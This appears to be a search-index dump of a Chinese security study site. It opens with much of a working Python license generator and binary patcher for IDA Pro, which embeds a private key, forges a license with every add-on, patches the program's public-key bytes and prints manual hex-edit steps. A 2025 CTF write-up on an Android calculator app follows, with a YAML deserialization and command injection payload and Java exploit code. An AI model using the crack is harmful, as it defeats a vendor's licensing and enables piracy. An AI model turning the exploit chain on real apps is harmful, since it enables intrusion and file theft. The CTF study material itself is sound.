\"M\",  # macOS\n    ]\n    addons = [\n        \"HEXX86\",\n        \"HEXX64\",\n        \"HEXARM\",\n        \"HEXARM64\",\n        \"HEXMIPS\",\n        \"HEXMIPS64\",\n        \"HEXPPC\",\n        \"HEXPPC64\",\n        \"HEXRV64\",\n        \"HEXARC\",\n        \"HEXARC64\",\n    ]\n\n    i = 0\n    for addon in addons:\n        i += 1\n        license[\"payload\"][\"licenses\"][0][\"add_ons\"].append(\n            {\n                \"id\": f\"48-1337-0000-{i:02}\",\n                \"code\": addon,\n                \"owner\": license[\"payload\"][\"licenses\"][0][\"id\"],\n                \"start_date\": \"2024-08-10 00:00:00\",\n                \"end_date\": \"2033-12-31 23:59:59\",\n            }\n        )\n\n\nadd_every_addon(license)\n\n\ndef json_stringify_alphabetical(obj):\n    \"\"\"\u5c06\u5bf9\u8c61\u8f6c\u6362\u4e3a\u6392\u5e8f\u540e\u7684JSON\u5b57\u7b26\u4e32\"\"\"\n    return json.dumps(obj, sort_keys=True, separators=(\",\", \":\"))\n\n\ndef buf_to_bigint(buf):\n    \"\"\"\u5b57\u8282\u7f13\u51b2\u533a\u8f6c\u6362\u4e3a\u5927\u6574\u6570\"\"\"\n    return int.from_bytes(buf, byteorder=\"little\")\n\n\ndef bigint_to_buf(i):\n    \"\"\"\u5927\u6574\u6570\u8f6c\u6362\u4e3a\u5b57\u8282\u7f13\u51b2\u533a\"\"\"\n    return i.to_bytes((i.bit_length() + 7) // 8, byteorder=\"little\")\n\n\n# \u539f\u59cbHexRays\u516c\u94a5\u6a21\u6570\npub_modulus_hexrays = buf_to_bigint(\n    bytes.fromhex(\n        \"edfd425cf978546e8911225884436c57140525650bcf6ebfe80edbc5fb1de68f4c66c29cb22eb668788afcb0abbb718044584b810f8970cddf227385f75d5dddd91d4f18937a08aa83b28c49d12dc92e7505bb38809e91bd0fbd2f2e6ab1d2e33c0c55d5bddd478ee8bf845fcef3c82b9d2929ecb71f4d1b3db96e3a8e7aaf93\"\n    )\n)\n\n# \u4fee\u8865\u540e\u7684\u516c\u94a5\u6a21\u6570\uff085C -&gt; CB\uff09\npub_modulus_patched = buf_to_bigint(\n    bytes.fromhex(\n        \"edfd42cbf978546e8911225884436c57140525650bcf6ebfe80edbc5fb1de68f4c66c29cb22eb668788afcb0abbb718044584b810f8970cddf227385f75d5dddd91d4f18937a08aa83b28c49d12dc92e7505bb38809e91bd0fbd2f2e6ab1d2e33c0c55d5bddd478ee8bf845fcef3c82b9d2929ecb71f4d1b3db96e3a8e7aaf93\"\n    )\n)\n\n# \u79c1\u94a5\nprivate_key = buf_to_bigint(\n    bytes.fromhex(\n        \"77c86abbb7f3bb134436797b68ff47beb1a5457816608dbfb72641814dd464dd640d711d5732d3017a1c4e63d835822f00a4eab619a2c4791cf33f9f57f9c2ae4d9eed9981e79ac9b8f8a411f68f25b9f0c05d04d11e22a3a0d8d4672b56a61f1532282ff4e4e74759e832b70e98b9d102d07e9fb9ba8d15810b144970029874\"\n    )\n)\n\n\ndef decrypt(message):\n    \"\"\"\u89e3\u5bc6\u6d88\u606f\"\"\"\n    decrypted = pow(buf_to_bigint(message), exponent, pub_modulus_patched)\n    decrypted = bigint_to_buf(decrypted)\n    return decrypted[::-1]\n\n\ndef encrypt(message):\n    \"\"\"\u52a0\u5bc6\u6d88\u606f\"\"\"\n    encrypted = pow(buf_to_bigint(message[::-1]), private_key, pub_modulus_patched)\n    encrypted = bigint_to_buf(encrypted)\n    return encrypted\n\n\nexponent = 0x13\n\n\ndef sign_hexlic(payload: dict) -&gt; str:\n    \"\"\"\u4e3a\u8bb8\u53ef\u8bc1payload\u751f\u6210\u7b7e\u540d\"\"\"\n    data = {\"payload\": payload}\n    data_str = json_stringify_alphabetical(data)\n\n    buffer = bytearray(128)\n    # \u524d33\u5b57\u8282\u662f\u968f\u673a\u6570\u636e\n    for i in range(33):\n        buffer[i] = 0x42\n\n    # \u8ba1\u7b97\u6570\u636e\u7684SHA256\u54c8\u5e0c\n    sha256 = hashlib.sha256()\n    sha256.update(data_str.encode())\n    digest = sha256.digest()\n\n    # \u5c06\u54c8\u5e0c\u503c\u590d\u5236\u5230\u7f13\u51b2\u533a\n    for i in range(32):\n        buffer[33 + i] = digest[i]\n\n    # \u52a0\u5bc6\u7f13\u51b2\u533a\n    encrypted = encrypt(buffer)\n\n    return encrypted.hex().upper()\n\n\ndef patch(filename):\n    \"\"\"\u4fee\u8865\u6587\u4ef6\u4e2d\u7684\u516c\u94a5\u6a21\u6570\"\"\"\n    if not os.path.exists(filename):\n        print(f\"\u8df3\u8fc7: {filename} - \u6587\u4ef6\u672a\u627e\u5230\")\n        return False\n\n    try:\n        with open(filename, \"rb\") as f:\n            data = f.read()\n\n        # \u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u4fee\u8865\n        if data.find(bytes.fromhex(\"EDFD42CBF978\")) != -1:\n            print(f\"\u5df2\u4fee\u8865: {filename} - \u6587\u4ef6\u5df2\u7ecf\u4fee\u8865\u8fc7\")\n            return True\n\n        # \u68c0\u67e5\u662f\u5426\u5305\u542b\u539f\u59cb\u6a21\u6570\n        if data.find(bytes.fromhex(\"EDFD425CF978\")) == -1:\n            print(f\"\u65e0\u6cd5\u4fee\u8865: {filename} - \u4e0d\u5305\u542b\u539f\u59cb\u6a21\u6570\")\n            return False\n\n        # \u6267\u884c\u4fee\u8865\n        data = data.replace(\n            bytes.fromhex(\"EDFD425CF978\"), bytes.fromhex(\"EDFD42CBF978\")\n        )\n\n        # \u521b\u5efa\u5907\u4efd\n        backup_file = filename + \".backup\"\n        if not os.path.exists(backup_file):\n            with open(backup_file, \"wb\") as f:\n                f.write(open(filename, \"rb\").read())\n            print(f\"\u5df2\u521b\u5efa\u5907\u4efd: {backup_file}\")\n\n        # \u5199\u5165\u4fee\u8865\u540e\u7684\u6587\u4ef6\n        with open(filename, \"wb\") as f:\n            f.write(data)\n\n        print(f\"\u2713 \u6210\u529f\u4fee\u8865: {filename}\")\n        return True\n\n    except Exception as e:\n        print(f\"\u2717 \u4fee\u8865\u5931\u8d25: {filename} - \u9519\u8bef: {e}\")\n        return False\n\n\ndef find_and_patch_ida_files():\n    \"\"\"\u67e5\u627e\u5e76\u4fee\u8865IDA\u6587\u4ef6\"\"\"\n    # \u6240\u6709\u53ef\u80fd\u7684IDA\u6587\u4ef6\u76ee\u6807\n    targets = [\n        \"ida.dll\", \"ida32.dll\", \"ida64.dll\",\n        \"ida.exe\", \"ida32.exe\", \"ida64.exe\",\n        \"libida.so\", \"libida32.so\", \"libida64.so\",\n        \"libida.dylib\", \"libida32.dylib\", \"libida64.dylib\"\n    ]\n\n    found_files = []\n    patched_files = []\n\n    print(\"\\n\" + \"=\" * 60)\n    print(\"\u67e5\u627eIDA Pro\u6587\u4ef6...\")\n    print(\"=\" * 60)\n\n    # \u641c\u7d22\u6240\u6709\u53ef\u80fd\u7684\u8def\u5f84\n    search_paths = IDA_PATHS.copy()\n\n    # \u6dfb\u52a0\u5f53\u524d\u76ee\u5f55\n    search_paths.append(os.getcwd())\n\n    # \u6dfb\u52a0\u73af\u5883\u53d8\u91cf\u8def\u5f84\n    if 'IDA_DIR' in os.environ:\n        search_paths.append(os.environ['IDA_DIR'])\n\n    for ida_path in search_paths:\n        if os.path.exists(ida_path):\n            print(f\"\\n\u641c\u7d22\u8def\u5f84: {ida_path}\")\n            for target in targets:\n                full_path = os.path.join(ida_path, target)\n                if os.path.exists(full_path):\n                    found_files.append(full_path)\n                    print(f\"  \u627e\u5230: {target}\")\n\n    # \u5982\u679c\u6ca1\u6709\u627e\u5230\u6587\u4ef6\uff0c\u5c1d\u8bd5\u5728Program Files\u4e2d\u641c\u7d22\n    if not found_files:\n        program_files = [os.environ.get('ProgramFiles', r'C:\\Program Files')]\n        if os.environ.get('ProgramFiles(x86)'):\n            program_files.append(os.environ['ProgramFiles(x86)'])\n\n        for pf in program_files:\n            for root, dirs, files in os.walk(pf):\n                if 'IDA' in root:\n                    for file in files:\n                        if any(target in file for target in ['ida', 'libida']):\n                            full_path = os.path.join(root, file)\n                            if os.path.exists(full_path) and os.path.isfile(full_path):\n                                found_files.append(full_path)\n                                print(f\"  \u627e\u5230: {full_path}\")\n\n    # \u4fee\u8865\u627e\u5230\u7684\u6587\u4ef6\n    if found_files:\n        print(f\"\\n\u627e\u5230 {len(found_files)} \u4e2a\u6587\u4ef6\uff0c\u5f00\u59cb\u4fee\u8865...\")\n        for file_path in found_files:\n            if patch(file_path):\n                patched_files.append(file_path)\n    else:\n        print(\"\\n\u26a0\ufe0f \u672a\u627e\u5230\u4efb\u4f55IDA Pro\u6587\u4ef6\")\n\n    return patched_files\n\n\ndef verify_license():\n    \"\"\"\u9a8c\u8bc1\u751f\u6210\u7684\u8bb8\u53ef\u8bc1\u6587\u4ef6\"\"\"\n    try:\n        with open('idapro.hexlic', 'r', encoding='utf-8') as f:\n            license_data = json.load(f)\n\n        print(\"\\n\" + \"=\" * 60)\n        print(\"\u8bb8\u53ef\u8bc1\u9a8c\u8bc1\u4fe1\u606f\")\n        print(\"=\" * 60)\n        print(f\"\u540d\u79f0: {license_data['payload']['name']}\")\n        print(f\"\u90ae\u7bb1: {license_data['payload']['email']}\")\n        print(f\"\u4ea7\u54c1: {license_data['payload']['licenses'][0]['product']}\")\n        print(f\"\u7248\u672c: {license_data['payload']['licenses'][0]['product_version']}\")\n        print(\n            f\"\u6709\u6548\u671f: {license_data['payload']['licenses'][0]['start_date']} \u81f3 {license_data['payload']['licenses'][0]['end_date']}\")\n        print(f\"\u63d2\u4ef6\u6570\u91cf: {len(license_data['payload']['licenses'][0]['add_ons'])}\")\n        print(f\"\u7b7e\u540d\u957f\u5ea6: {len(license_data['signature'])} \u5b57\u7b26\")\n\n        # \u68c0\u67e5\u7b7e\u540d\u683c\u5f0f\n        signature = license_data['signature']\n        if len(signature) == 512:  # 256\u5b57\u8282\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u5e94\u8be5\u662f512\u5b57\u7b26\n            print(\"\u2713 \u7b7e\u540d\u957f\u5ea6\u6b63\u786e\")\n        else:\n            print(f\"\u26a0\ufe0f \u7b7e\u540d\u957f\u5ea6\u5f02\u5e38: {len(signature)} (\u671f\u671b: 512)\")\n\n        # \u68c0\u67e5\u6587\u4ef6\u5927\u5c0f\n        file_size = os.path.getsize('idapro.hexlic')\n        print(f\"\u6587\u4ef6\u5927\u5c0f: {file_size} \u5b57\u8282\")\n\n        return True\n\n    except Exception as e:\n        print(f\"\u2717 \u8bb8\u53ef\u8bc1\u9a8c\u8bc1\u9519\u8bef: {e}\")\n        return False\n\n\ndef manual_patch_instructions():\n    \"\"\"\u663e\u793a\u624b\u52a8\u4fee\u8865\u8bf4\u660e\"\"\"\n    print(\"\\n\" + \"=\" * 60)\n    print(\"\u624b\u52a8\u4fee\u8865\u8bf4\u660e\")\n    print(\"=\" * 60)\n    print(\"\u5982\u679c\u81ea\u52a8\u4fee\u8865\u5931\u8d25\uff0c\u8bf7\u624b\u52a8\u64cd\u4f5c\uff1a\")\n    print(\"1. \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\uff08\u5982HxD\u3001010 Editor\uff09\")\n    print(\"2. \u6253\u5f00IDA\u7684DLL\u6216EXE\u6587\u4ef6\")\n    print(\"3. \u641c\u7d22\u5341\u516d\u8fdb\u5236\u503c: ED FD 42 5C F9 78\")\n    print(\"4. \u66ff\u6362\u4e3a: ED FD 42 CB F9 78\")\n    print(\"5. \u4fdd\u5b58\u6587\u4ef6\")\n    print(\"\\n\u9700\u8981\u4fee\u8865\u7684\u6587\u4ef6\u901a\u5e38\u5305\u62ec\uff1a\")\n    print(\"   - ida64.dll / ida64.exe (64\u4f4d\u7248\u672c)\")\n    print(\"   - ida32.dll / ida32.exe (32\u4f4d\u7248\u672c)\")\n    print(\"   - libida64.so / libida64.dylib (Linux/macOS)\")\n\n\ndef usage_instructions():\n    \"\"\"\u663e\u793a\u4f7f\u7528\u8bf4\u660e\"\"\"\n    print(\"\\n\" + \"=\" * 60)\n    print(\"\u4f7f\u7528\u8bf4\u660e\")\n    print(\"=\" * 60)\n    print(\"1. \u8bb8\u53ef\u8bc1\u6587\u4ef6: idapro.hexlic\")\n    print(\"   \u4f4d\u7f6e: \u5f53\u524d\u76ee\u5f55\")\n    print(\"\")\n    print(\"2. \u5b89\u88c5\u6b65\u9aa4:\")\n    print(\"   a) \u5c06 idapro.hexlic \u590d\u5236\u5230:\")\n    print(\"      IDA\u5b89\u88c5\u76ee\u5f55/licenses/ \u6587\u4ef6\u5939\")\n    print(\"\")\n    print(\"   b) \u786e\u4fddIDA\u5e93\u6587\u4ef6\u5df2\u6b63\u786e\u4fee\u8865\")\n    print(\"      (\u5c065C\u6539\u4e3aCB)\")\n    print(\"\")\n    print(\"3. \u542f\u52a8IDA Pro\uff0c\u5e94\u8be5\u4f1a\u81ea\u52a8\u52a0\u8f7d\u8bb8\u53ef\u8bc1\")\n    print(\"\")\n    print(\"4. \u5982\u679c\u9047\u5230\u95ee\u9898:\")\n    print(\"   - \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u4fee\u8865\u6210\u529f\")\n    print(\"   - \u5c1d\u8bd5\u624b\u52a8\u4fee\u8865\")\n    print(\"   - \u786e\u4fdd\u8bb8\u53ef\u8bc1\u6587\u4ef6\u5728\u6b63\u786e\u4f4d\u7f6e\")\n\n\ndef main():\n    \"\"\"\u4e3b\u51fd\u6570\"\"\"\n    print(\"IDA Pro \u8bb8\u53ef\u8bc1\u751f\u6210\u5668\")\n    print(\"\u7248\u672c: 1.0\")\n    print(\"=\" * 60)\n\n    # \u751f\u6210\u8bb8\u53ef\u8bc1\n    try:\n        print(\"\\n\u751f\u6210\u8bb8\u53ef\u8bc1...\")\n        license[\"signature\"] = sign_hexlic(license[\"payload\"])\n        serialized = json_stringify_alphabetical(license)\n\n        with open(\"idapro.hexlic\", \"w\", encoding='utf-8') as f:\n            f.write(serialized)\n\n        print(\"\u2713 \u8bb8\u53ef\u8bc1\u6587\u4ef6\u751f\u6210\u6210\u529f: idapro.hexlic\")\n\n    except Exception as e:\n        print(f\"\u2717 \u8bb8\u53ef\u8bc1\u751f\u6210\u5931\u8d25: {e}\")\n        return\n\n    # \u9a8c\u8bc1\u8bb8\u53ef\u8bc1\n    verify_license()\n\n    # \u67e5\u627e\u5e76\u4fee\u8865\u6587\u4ef6\n    patched_files = find_and_patch_ida_files()\n\n    # \u663e\u793a\u7ed3\u679c\n    if patched_files:\n        print(f\"\\n\u2713 \u6210\u529f\u4fee\u8865 {len(patched_files)} \u4e2a\u6587\u4ef6\")\n    else:\n        print(\"\\n\u26a0\ufe0f \u6ca1\u6709\u6587\u4ef6\u88ab\u4fee\u8865\uff0c\u9700\u8981\u624b\u52a8\u64cd\u4f5c\")\n        manual_patch_instructions()\n\n    # \u663e\u793a\u4f7f\u7528\u8bf4\u660e\n    usage_instructions()\n\n    # \u663e\u793a\u8bb8\u53ef\u8bc1\u6587\u4ef6\u5185\u5bb9\u9884\u89c8\n    try:\n        with open('idapro.hexlic', 'r', encoding='utf-8') as f:\n            content = f.read()\n            print(f\"\\n\u8bb8\u53ef\u8bc1\u6587\u4ef6\u9884\u89c8 (\u524d200\u5b57\u7b26):\")\n            print(content[:200] + \"...\" if len(content) &gt; 200 else content)\n    except:\n        pass\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"study/reverse/tools/ida_pro/#_4","title":"\u63a8\u8350\u63d2\u4ef6","text":"<ol> <li>Findcrypt<ul> <li>\u7528\u4e8e\u67e5\u627e\u52a0\u89e3\u5bc6\u7b97\u6cd5</li> </ul> </li> <li>WPeChatGPT<ul> <li>\u4f7f\u7528OpenAI\u63a5\u53e3\u5411\u5927\u6a21\u578b\u8bf7\u6c42\u4ee3\u7801\u5206\u6790</li> </ul> </li> <li>ida-pro-mcp<ul> <li>\u901a\u8fc7\u672c\u5730mcp\u670d\u52a1\u8ba9\u5927\u6a21\u578b\u8c03\u7528ida\u63a5\u53e3\u5206\u6790\u4ee3\u7801</li> <li>\u4ec0\u4e48\u65f6\u5019\u51fa\u8c03\u8bd5\u529f\u80fd\u545c\u545c\u545c</li> </ul> </li> <li>ScyllaHide<ul> <li>ScyllaHide for ida9.0 \u6e90\u9879\u76ee\u4e0d\u5927\u4f1a\u7528awa</li> </ul> </li> <li></li> </ol>"},{"location":"study/wp/2025-10/qwb_2025/","title":"\u5f3a\u7f51\u676f2025","text":""},{"location":"study/wp/2025-10/qwb_2025/#qcalc","title":"Qcalc","text":"<p>\u8d5b\u9898\u4e0b\u8f7d</p>"},{"location":"study/wp/2025-10/qwb_2025/#_1","title":"\u5229\u7528\u70b9","text":"<ol> <li> <p>\u540e\u95e8\u7c7b\u6267\u884c\u6307\u4ee4</p> Java<pre><code>package com.qinquang.calc;\n\nimport android.util.Log;\n\n/* loaded from: classes3.dex */\npublic final class PingUtil {\n    private static final String TAG = \"PingUtil\";\n\n    public PingUtil(String address) {\n        try {\n            Log.d(TAG, \"PingUtil constructor called with: \" + address);\n            String pingCmd = \"ping -c 1 \" + address;\n            Process process = Runtime.getRuntime().exec(new String[]{\"/system/bin/sh\", \"-c\", pingCmd});\n            Log.d(TAG, \"Command executed: \" + pingCmd);\n            process.waitFor();\n        } catch (Exception e) {\n            Log.e(TAG, \"Error executing ping command\", e);\n        }\n    }\n}\n</code></pre> <p>\u8fd9\u4e2a\u7c7b\u4e2d\u7684\u6784\u9020\u51fd\u6570\u4f1a\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u63a5\u5728<code>ping -c 1</code>\u540e\u88ab\u6267\u884c</p> \u4e3a\u4ec0\u4e48\u662f-c <ul> <li><code>-c</code> \u544a\u8bc9 shell\uff08\u8fd9\u91cc\u662f <code>/system/bin/sh</code>\uff09\u4ece\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u5e76\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u662f\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f\u3002</li> </ul> </li> <li> <p>yaml\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08SnakeYaml\uff09</p> <p>\u539f\u7406\uff1aSnakeYaml \u53cd\u5e8f\u5217\u5316</p> <p>\u6e90\u7801\uff1a</p> Java<pre><code>public class HistoryManager {\n    public static final String HISTORY_FILE_NAME = \"history.yml\";\n    //\u7701\u7565\n    public List&lt;String&gt; loadHistory() {\n        Yaml yaml = new Yaml();\n        try {\n            FileInputStream fis = this.context.openFileInput(HISTORY_FILE_NAME);\n            InputStreamReader reader = new InputStreamReader(fis);\n            try {\n                Object result = yaml.load(reader);\n</code></pre> </li> <li> <p>\u975e\u6cd5Intent\u63d0\u6743</p> <p>\u5728MainActivity\u4e2donEqual\u5982\u679c\u51fa\u73b0\u5f02\u5e38\u5e76\u4e14\u6709fallbackIntent\u4fbf\u4f1a\u8fdb\u5165BridgeActivity</p> Java<pre><code>public void onEqual(View view) {\n        char c;\n        if (this.input.isEmpty() || this.operator.isEmpty()) {\n            return;\n        }\n        double secondNum = Double.parseDouble(this.input);\n        double result = 0.0d;\n        String expression = this.firstNum + \" \" + this.operator + \" \" + secondNum;\n        try {\n            String str = this.operator;\n            switch (str.hashCode()) {\n        // \u7701\u7565\n                case 3:\n                    result = this.firstNum / secondNum;\n                    if (!Double.isInfinite(result) &amp;&amp; !Double.isNaN(result)) {\n                        break;\n                    } else {\n                        throw new ArithmeticException(\"Division by zero detected\");\n                    }\n            }\n            String fullCalculation = expression + \" = \" + result;\n            this.tvInput.setText(String.valueOf(result));\n            this.historyManager.saveHistory(fullCalculation);\n        } catch (Exception unused) {\n            Log.d(\"QiangCalc\", \"Exception during calculation: \" + unused.getMessage());\n            unused.printStackTrace();\n            Intent fallbackIntent = (Intent) getIntent().getParcelableExtra(\"fallback\");\n            Log.d(\"QiangCalc\", \"Fallback intent: \" + (fallbackIntent != null ? \"found\" : \"not found\"));\n            if (fallbackIntent != null) {\n                Log.d(\"QiangCalc\", \"Fallback intent data: \" + fallbackIntent.getData());\n                Log.d(\"QiangCalc\", \"Fallback intent extras: \" + fallbackIntent.getExtras());\n                fallbackIntent.addFlags(268435456);\n                ContentValues bridgeValues = new ContentValues();\n                bridgeValues.put(\"action\", \"process\");\n                bridgeValues.put(TypedValues.AttributesType.S_TARGET, \"history\");\n                bridgeValues.put(\"timestamp\", Long.valueOf(System.currentTimeMillis()));\n                fallbackIntent.putExtra(\"bridge_values\", bridgeValues);\n                String signature = getIntent().getStringExtra(\"calc_signature\");\n                fallbackIntent.putExtra(\"bridge_signature\", signature);\n                Intent bridgeIntent = new Intent(this, BridgeActivity.class);\n                bridgeIntent.putExtra(\"origIntent\", fallbackIntent);\n                startActivity(bridgeIntent);\n                finish();\n            }\n            this.tvInput.setText(\"Error\");\n        }\n        this.input = \"\";\n        this.operator = \"\";\n    }\n</code></pre> <p>BridgeActivity\u68c0\u9a8c\u4e86\u4e00\u7cfb\u5217\u6761\u4ef6\uff0c\u90fd\u7b26\u5408\u65f6\u7ed9\u8be5Intent\u8bfb\u5199history.yml\u6743\u9650</p> Java<pre><code>            if (values != null &amp;&amp; processContentValues(values)) {\n                String token = origIntent.getStringExtra(\"bridge_token\");\n                if (!validateToken(token)) {\n                    Log.e(TAG, \"Invalid token\");\n                    finish();\n                    return;\n                }\n                File historyFile = new File(getFilesDir(), HistoryManager.HISTORY_FILE_NAME);\n                Uri historyUri = Uri.parse(\"content://com.qinquang.calc/\" + historyFile.getName());\n                origIntent.setData(historyUri);\n                origIntent.addFlags(3);\n                startActivity(origIntent);\n</code></pre> </li> </ol>"},{"location":"study/wp/2025-10/qwb_2025/#_2","title":"\u653b\u51fb\u94fe","text":"<ol> <li> <p>\u5e94\u7528\u9664\u96f6\u5f02\u5e38\uff0c\u5c06\u6784\u9020\u7684\u6076\u610fIntent\u4f20\u5165\u6865\u63a5\uff0c\u5f80history.yml\u4e2d\u5199\u5165\u6076\u610f\u4ee3\u7801</p> Bash<pre><code>\"!!com.qinquang.calc.PingUtil [ '8.8.8.8;cat /data/data/com.qinquang.calc/flag-*.txt &gt; /data/data/com.qinquang.calc/files/history.yml' ]\"\n</code></pre> </li> <li> <p>\u901a\u8fc7\u9664\u96f6\u5f02\u5e38\uff0c\u4f20\u5165\u5386\u53f2\u8bb0\u5f55Intent\uff0c\u89e6\u53d1loadHistory\uff0cyaml\u53cd\u5e8f\u5217\u5316\u6267\u884c</p> Bash<pre><code>ping -c 1 8.8.8.8;cat /data/data/com.qinquang.calc/flag-*.txt &gt; /data/data/com.qinquang.calc/files/history.yml\n</code></pre> </li> <li> <p>\u518d\u6b21\u5e94\u7528\u9664\u96f6\u5f02\u5e38\uff0c\u8bfb\u53d6history.yml</p> </li> </ol>"},{"location":"study/wp/2025-10/qwb_2025/#exp","title":"exp\u7f16\u5199","text":"<p>\u8fd9\u91cc\u4ec5\u7ed9\u51fa\u5173\u952e\u4ee3\u7801\u7247\u6bb5</p> \u4f20\u5165\u6076\u610fintent<pre><code>private void readResult() {\n    Intent payloadIntent = new Intent();\n    // \u5982\u679c\u662f\u8bfb\u53d6HistoryActivity\u6539\u4e3a(\"com.qinquang.calc\", \"com.qinquang.calc.HistoryActivity\")\u5373\u53ef\n    payloadIntent.setClassName(getPackageName(), \"com.n0rth5ea.creakcluc.PermissionReceiverActivity\");\n    payloadIntent.putExtra(\"read_mode\", true); // \u4ee5\u8bfb\u53d6\u6a21\u5f0f\u4e3a\u4f8b\n\n    // \u6784\u9020bridge_values\n    ContentValues values = new ContentValues();\n    values.put(\"action\", \"process\");\n    values.put(\"target\", \"history\");\n    payloadIntent.putExtra(\"bridge_values\", values);\n\n    // \u751f\u6210token\n    String token = \"aaf4b4eb2510cf9e\";\n    payloadIntent.putExtra(\"bridge_token\", token);\n\n    // \u8bbe\u7f6eflags\n    payloadIntent.setFlags(Intent.FLAG_FROM_BACKGROUND);\n\n    // \u6784\u9020\u89e6\u53d1Intent\n    Intent triggerIntent = new Intent(Intent.ACTION_VIEW);\n    triggerIntent.setData(Uri.parse(\"qiangcalc://calculate?expression=10/0\"));\n    triggerIntent.putExtra(\"fallback\", payloadIntent);\n    triggerIntent.setPackage(\"com.qinquang.calc\");\n\n    try {\n        startActivity(triggerIntent);\n        log(\"[+] Read request sent. Check Logcat for the flag.\");\n    } catch (Exception e) {\n        log(\"[!] Failed to send read request: \" + e.getMessage());\n    }\n}\n</code></pre> \u5199\u5165\u548c\u8bfb\u53d6intent\u8bbe\u8ba1<pre><code>Intent intent = getIntent();\nif (intent != null &amp;&amp; intent.getData() != null) {\n    Uri historyUri = intent.getData();\n    boolean isReadMode = intent.getBooleanExtra(\"read_mode\", false);\n\n    if (isReadMode) {\n        // \u8bfb\u53d6\u6a21\u5f0f\uff1a\u4ecehistory.yml\u8bfb\u53d6flag\n        Log.d(TAG, \"Read mode: Reading flag from history.yml\");\n        try (InputStream is = getContentResolver().openInputStream(historyUri);\n             BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {\n\n            StringBuilder flagContent = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                flagContent.append(line);\n            }\n            String flag = flagContent.toString();\n\n            Log.d(TAG, \"SUCCESS! Flag captured: \" + flag);\n            Toast.makeText(this, \"Flag captured! Check Logcat.\", Toast.LENGTH_LONG).show();\n            MainActivity.flag = flag;\n\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to read from history.yml\", e);\n            Toast.makeText(this, \"Failed to read flag: \" + e.getMessage(), Toast.LENGTH_LONG).show();\n        }\n\n    } else {\n        // \u5199\u5165\u6a21\u5f0f\uff1a\u5199\u5165\u6076\u610fYAML\u5230history.yml\n        Log.d(TAG, \"Write mode: Writing malicious YAML to history.yml\");\n\n        // \u6784\u9020\u6076\u610fYAML\uff0c\u4f7f\u7528PingUtil\u6267\u884c\u547d\u4ee4\u5c06flag\u5199\u5165history.yml\n        String maliciousYaml = \"!!com.qinquang.calc.PingUtil [ '8.8.8.8; cat /data/data/com.qinquang.calc/flag-*.txt &gt; /data/data/com.qinquang.calc/files/history.yml' ]\";\n\n        try (OutputStream os = getContentResolver().openOutputStream(historyUri)) {\n            if (os != null) {\n                os.write(maliciousYaml.getBytes(StandardCharsets.UTF_8));\n                Log.d(TAG, \"Successfully wrote malicious YAML to history.yml\");\n                Toast.makeText(this, \"Payload written successfully\", Toast.LENGTH_SHORT).show();\n            }\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to write to history.yml\", e);\n            Toast.makeText(this, \"Failed to write payload: \" + e.getMessage(), Toast.LENGTH_LONG).show();\n        }\n    }\n}\n</code></pre>"}]}